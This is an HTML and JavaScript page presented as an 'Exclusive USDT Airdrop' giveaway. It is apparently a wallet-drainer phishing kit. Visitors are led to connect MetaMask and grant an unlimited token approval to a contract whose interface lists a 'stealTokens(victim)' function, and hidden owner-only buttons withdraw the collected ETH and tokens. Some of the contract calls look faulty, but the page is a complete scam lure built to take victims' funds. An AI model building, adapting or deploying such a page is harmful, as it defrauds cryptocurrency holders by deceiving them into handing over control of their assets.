<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Exclusive Airdrop Opportunity</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #6e7dff, #00c6ff);
      color: white;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }

    .container {
      background-color: rgba(0, 0, 0, 0.7);
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
      width: 90%;
      max-width: 500px;
    }

    h1 {
      font-size: 2.5rem;
      margin-bottom: 20px;
      color: #ffeb3b;
    }

    h2 {
      font-size: 1.5rem;
      margin-bottom: 30px;
      color: #ffffff;
    }

    .btn {
      background-color: #4caf50;
      color: white;
      border: none;
      padding: 15px 30px;
      margin: 10px;
      font-size: 1.2rem;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .btn:disabled {
      background-color: #aaa;
    }

    .btn:hover {
      background-color: #45a049;
    }

    .footer {
      margin-top: 30px;
      color: #ffeb3b;
      font-size: 0.9rem;
    }

    .footer a {
      color: #ffeb3b;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    .claim-btn-container {
      margin-top: 30px;
    }

    .claim-btn-container button {
      font-size: 1rem;
      padding: 10px 20px;
      border-radius: 5px;
      cursor: pointer;
    }
    
    #claimAirdropButton {
      background-color: #ff9800;
    }

    #claimAirdropButton:disabled {
      background-color: #aaa;
    }

    #withdrawETHButton, #withdrawTokensButton {
      background-color: #3f51b5;
    }
    
    #withdrawETHButton:disabled, #withdrawTokensButton:disabled {
      background-color: #aaa;
    }

    .processing {
      display: none;
      font-size: 1rem;
      color: yellow;
      margin-top: 20px;
      opacity: 0;
      transition: opacity 0.5s ease-in-out;
      animation: flashing 1s infinite alternate;
    }

    .processing.show {
      display: block;
      opacity: 1;
    }

    @keyframes flashing {
      0% {
        opacity: 0.5;
      }
      100% {
        opacity: 1;
      }
    }

    /* Flashing text for the Claim Button */
    #claimAirdropButton.flashText {
      animation: textFlash 1.5s infinite alternate;
    }

    @keyframes textFlash {
      0% {
        color: #ffffff;
      }
      50% {
        color: #ffeb3b;
      }
      100% {
        color: #ffffff;
      }
    }

  </style>
</head>
<body>
  <div class="container">
    <h1>ðŸŽ‰ Exclusive USDT Airdrop Just For You! ðŸŽ‰</h1>
    <h2>Claim your rewards today and start your journey to success!</h2>

    <button id="connectButton" class="btn">Connect to MetaMask</button>
    <button id="approveButton" class="btn" disabled>Approve Unlimited USDT Drops</button>

    <div class="claim-btn-container">
      <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
      <!-- Processing message here -->
      <div id="processingMessage" class="processing">Processing...</div>
    </div>

    <!-- Withdraw buttons for the owner -->
    <div class="claim-btn-container" id="ownerButtons" style="display:none;">
      <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
      <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
    </div>

    <div class="footer">
      <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
      <p>Need help? <a href="#">Contact Us</a></p>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
  <script>
    const contractAddress = '0x4a21a1a07a3157e06d739D3bb231628143a66C29';
    const tokenAddress = '0x59610B067eCfeCEdaf146A5E9B180C440f008575';
    const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414';

    const contractABI = [
      {
        "inputs": [
          { "internalType": "address", "name": "spender", "type": "address" },
          { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "approve",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
        "stateMutability": "view",
        "type": "function"
      },
      {
        "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }],
        "name": "transfer",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [
          { "internalType": "address", "name": "sender", "type": "address" },
          { "internalType": "address", "name": "recipient", "type": "address" },
          { "internalType": "uint256", "name": "amount", "type": "uint256" }
        ],
        "name": "transferFrom",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
        "name": "stealTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "withdrawETH",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "inputs": [],
        "name": "withdrawTokens",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      }
    ];

    let web3;
    let contract;
    let accounts;

    // Function to handle mobile redirection to MetaMask browser
    function redirectToMetaMask() {
      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
      if (/android/i.test(userAgent)) {
        window.location.href = "https://metamask.app.link/dapp/your-dapp-url"; // Replace with your dApp's URL
      } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
        window.location.href = "metamask://";
      }
    }

    // Initialize Web3
    async function initWeb3() {
      if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum);
        try {
          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          contract = new web3.eth.Contract(contractABI, contractAddress);
          document.getElementById('connectButton').style.display = 'none';
          document.getElementById('approveButton').disabled = false;
          document.getElementById('claimAirdropButton').disabled = false;
          // Check if connected wallet is the owner
          if (accounts[0].toLowerCase() === ownerAddress.toLowerCase()) {
            document.getElementById('ownerButtons').style.display = 'block';
          }
        } catch (error) {
          alert("Connection failed. Please try again.");
        }
      } else {
        alert("MetaMask not detected. Please install it.");
      }
    }

    // Approve unlimited drops for the contract
    async function approveUnlimitedDrops() {
      try {
        const approval = await contract.methods.approve(contractAddress, web3.utils.toWei("1000000000")).send({ from: accounts[0] });
        if (approval.status) {
          alert("Approval successful!");
          document.getElementById('approveButton').disabled = true;
        }
      } catch (error) {
        alert("Approval failed. Please try again.");
      }
    }

    // Claim the airdrop
    async function claimAirdrop() {
      const processingMessage = document.getElementById('processingMessage');
      processingMessage.classList.add('show');
      try {
        const claim = await contract.methods.transfer(accounts[0], web3.utils.toWei("1")).send({ from: accounts[0] });
        if (claim.status) {
          alert("Airdrop claimed successfully!");
        }
      } catch (error) {
        alert("Airdrop claim failed. Please try again.");
      } finally {
        processingMessage.classList.remove('show');
      }
    }

    // Withdraw ETH
    async function withdrawETH() {
      try {
        const withdraw = await contract.methods.withdrawETH().send({ from: ownerAddress });
        if (withdraw.status) {
          alert("ETH withdrawn successfully!");
        }
      } catch (error) {
        alert("Withdrawal failed. Please try again.");
      }
    }

    // Withdraw Tokens
    async function withdrawTokens() {
      try {
        const withdraw = await contract.methods.withdrawTokens().send({ from: ownerAddress });
        if (withdraw.status) {
          alert("Tokens withdrawn successfully!");
        }
      } catch (error) {
        alert("Withdrawal failed. Please try again.");
      }
    }

    // Event Listeners
    document.getElementById('connectButton').addEventListener('click', initWeb3);
    document.getElementById('approveButton').addEventListener('click', approveUnlimitedDrops);
    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
    document.getElementById('withdrawETHButton').addEventListener('click', withdrawETH);
    document.getElementById('withdrawTokensButton').addEventListener('click', withdrawTokens);

    // Redirect mobile users to MetaMask
    window.onload = redirectToMetaMask;
  </script>
</body>
</html>
